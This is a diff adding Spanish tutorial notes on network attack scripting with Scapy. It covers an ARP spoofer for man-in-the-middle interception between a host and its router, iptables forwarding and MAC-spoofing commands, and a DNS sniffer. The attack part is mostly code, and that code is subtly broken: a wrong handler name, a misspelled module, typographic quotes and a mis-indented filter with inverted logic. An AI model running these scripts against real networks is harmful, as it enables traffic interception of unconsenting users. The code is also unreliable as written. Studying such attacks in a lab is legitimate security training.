@@ -3672,10 +3672,113 @@ if __name__ == "__name__":
 
 <h3 class="titulo-principal">Scripting - ARP Spoofer con Scapy</h3>
 
+Se pierde mucho control al usar herramientas como Script Kiddie, entonces para el envenenamiento ARP se hace un ataque de MITM un ATAQUE de el hombre en el medio.
+
+> Básicamente permite interceptar el trafico generado por un host.
+
+Hay que realizar 2 respuestas, la primera que se envía es al router con la dirección IP de la máquina pero, con mi MAC de atacante. La segunda respuesta es a la máquina windows con la IP del router pero, con mi dirección MAC. La cache de ambos dispositivos esta siendo alterada haciéndole creer que la MAC vinculada es la nuestra. Conseguimos de todo. ARP no tiene autenticación y por eso es inevitable este ataque.
+
+> A partir de esta clase se basan las siguientes con ARP.
+
+Hay que configurar unas reglas IP tables.
+
+```bash
+iptables —policy FORWARD ACCEPT
+```
+
+Esto permitirá aceptar paquetes entrantes y luego redirigirlos de vuelta al destino. Luego hay que realizar en la terminal:
+
+```bash
+cat /proc/sys/net/ipv4/ip_forward
+1
+```
+
+Debe tener un 1 para poder comunicarlos de vuelta al destino.
+
+Script
+```python
+#!/usr/bin/env python3
+import argparse
+import sys
+import signal
+import scapy.all as scapy
+import time
+
+def def_handler(sig, frame):
+    print(f”[!] Saliendo del programa...”)
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, del_handler)
+
+def get_arguments():
+    parser = arparse.ArgumentParser(description=“ARP Spoofer”)
+    parser.add_argument(“-t”, “--target”, required=True, dest=“ip_address”, help=“Host o IP range to spoof”)
+    return parser.parse_args()
+
+def spoof(ip_address, spoof_ip):
+    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc=“aa:bb:cc:44:55:66”)
+    scapy.send(arp_packet, verbose=False)
+
+def main():
+    arguments = get_arguments()
+    while True:
+        spoof(arguments.ip_address, “192.168.1.1”)
+        spoof(“192.168.1.1”, arguments.ip_address)
+        time.sleep(2)
+
+
+if __name__ == “__main__”:
+    main()
+```
+
+Dar de baja la interfaz de red
+
+```bash
+ifconfig enp3s0 down
+macchanger --mac=“aa:bb:cc:44:55:66” enp3s0
+ifconfig enp3s0 up
+macchanger -s enp3s0
+```
+
 <h3 class="titulo-principal">Scripting - DNS Sniffer</h3>
 
-<h3 class="titulo-principal">Scripting - HTTP Sniffer</h3>
+Después de hacer un envenenamiento ARP, ya prácticamente como tenemos un gran control, se debe saber filtrar y manipular paquetes para poder llevar a cabo nuestras tareas. Para este caso un sniffer DNS. Debido a que DNS trabaja por UDP y en el puerto 53.
 
+```python
+#!/usr/bin/env python3
+import signal
+import sys
+import scapy.all as scapy
+
+def def_handler(sig, frame):
+    print(f”[!] Saliendo...”)
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+def process_dns_packet(packet):
+    #print(packet.show())
+    if packet.haslayer(scapy.DNSQR):
+        print(packet.show())
+        domain = packet[scapy.DNSQR].qname.decode()
+        exclude_keywords = [”google”, “cloud”, “bing”, “static”]
+    if any(keyword in domain for keyword in exclude_keywords):
+        print(f”[+] Dominio: {domain}”)
+
+def main():
+    global domains_seen
+    domains_seen = set()
+    interface = “enp3s0”
+    scapy.sniff(iface=interface, filter=“udp and port 53”, prn=process_dns_packet, store=0)
+
+
+if __name__ == “__main__”:
+    main()
+
+```
+
+<h3 class="titulo-principal">Scripting - HTTP Sniffer</h3>
+    
 <h3 class="titulo-principal">Scripting - HTTPS_Image Sniffer con mitmdump</h3>
 
 <h3 class="titulo-principal">Scripting - DNS Spoofer con Scapy y NetfilterQueue</h3>
